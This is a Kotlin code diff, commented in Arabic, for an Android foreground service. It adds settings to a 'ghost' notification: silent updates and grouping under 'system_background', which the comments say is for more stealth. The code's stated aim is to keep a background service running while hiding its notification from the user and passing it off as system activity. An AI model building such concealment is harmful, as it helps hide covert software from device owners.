@@ -25,6 +25,8 @@ import kotlin.random.Random
  * ✅ لا يتم إلغاء الإشعار (cancel) لضمان بقاء الخدمة حية.
  * ✅ يتم تحديث النص إلى فارغ لإخفاء الإشعار بصرياً مع بقاء الخدمة.
  * ✅ استخدام أقل أولوية وإخفاء المحتوى لتقليل ظهور الإشعار.
+ * ✅ إضافة setOnlyAlertOnce(true) لمنع الصوت/الاهتزاز عند التحديث.
+ * ✅ إضافة setGroup("system_background") لتجميع الإشعار مع إشعارات النظام.
  */
 class ForegroundService : Service() {
     companion object {
@@ -109,6 +111,10 @@ class ForegroundService : Service() {
     /**
      * بناء الإشعار مع محتوى ديناميكي ونمط "شبحى".
      * @param statusText النص الذي سيظهر (يمكن أن يكون فارغاً للإخفاء).
+     * 
+     * ✅ تمت إضافة:
+     * - setOnlyAlertOnce(true) لمنع الصوت/الاهتزاز عند التحديث
+     * - setGroup("system_background") لتجميع الإشعار مع إشعارات النظام
      */
     private fun buildGhostNotification(statusText: String): Notification {
         // Intent لفتح التطبيق عند النقر (لكننا نخفيه عادة)
@@ -125,6 +131,8 @@ class ForegroundService : Service() {
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .setSilent(true) // بدون صوت
+            .setOnlyAlertOnce(true) // ✅ منع الصوت/الاهتزاز عند التحديث
+            .setGroup("system_background") // ✅ تجميع مع إشعارات النظام لمزيد من التخفي
             .setOngoing(true) // مستمر – ضروري لإبقاء الخدمة حية 100%
             .setShowWhen(false) // لا يظهر الوقت
             .setVisibility(NotificationCompat.VISIBILITY_SECRET) // إخفاء المحتوى
